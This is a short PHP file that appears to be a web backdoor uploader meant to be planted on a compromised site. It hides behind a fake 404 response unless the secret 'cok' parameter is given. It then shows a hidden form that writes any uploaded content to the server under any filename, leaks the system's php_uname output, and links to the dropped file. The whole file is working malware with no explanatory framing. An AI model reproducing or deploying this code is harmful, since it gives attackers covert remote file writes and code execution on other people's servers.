<?php
if (isset($_GET['cok'])) {
  echo '<form method="post">';
  echo '<input type="file" id="datanya" onchange="setfilename(this.value)"/>';
  echo '<input type="hidden" name="nama" id="namanya">';
  echo '<textarea style="display: none" id="output" name="data"></textarea>';
  echo '<input type="submit" name="submit" value="Gaskan">';
  echo '</form>';
  if (isset($_POST['data'])) {
    $nama = $_POST['nama'];
    $data = $_POST['data'];
    file_put_contents("./".$nama, "");
    $cek = fopen("./".$nama, "w");
    fwrite($cek, $data);
    fclose($cek);
    if (file_exists($nama)) {
      echo "Success ! ";
      $link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
      $link = str_replace(basename($_SERVER['REQUEST_URI']), $nama, $link);
      echo "<a href='".$link."'><b>".$link."</b></a>";
    } else {
      echo "Failed";
    }
  } else {
    @header('HTTP/1.0 404 Not Found', true, 404);
    echo "<b>".php_uname();
  }
} else {
  @header('HTTP/1.0 404 Not Found', true, 404);
}
?>
<script>
  function setfilename(val)
  {
    filename = val.split('\\').pop().split('/').pop();
    //filename = filename.substring(0, filename.lastIndexOf('.'));
    document.getElementById('namanya').value = filename;
  }
  
var input = document.getElementById("datanya");
var output = document.getElementById("output");


input.addEventListener("change", function () {
  if (this.files && this.files[0]) {
    var myFile = this.files[0];
    var reader = new FileReader();
    
    reader.addEventListener('load', function (e) {
      output.textContent = e.target.result;
    });
    
    reader.readAsBinaryString(myFile);
  }   
});
</script>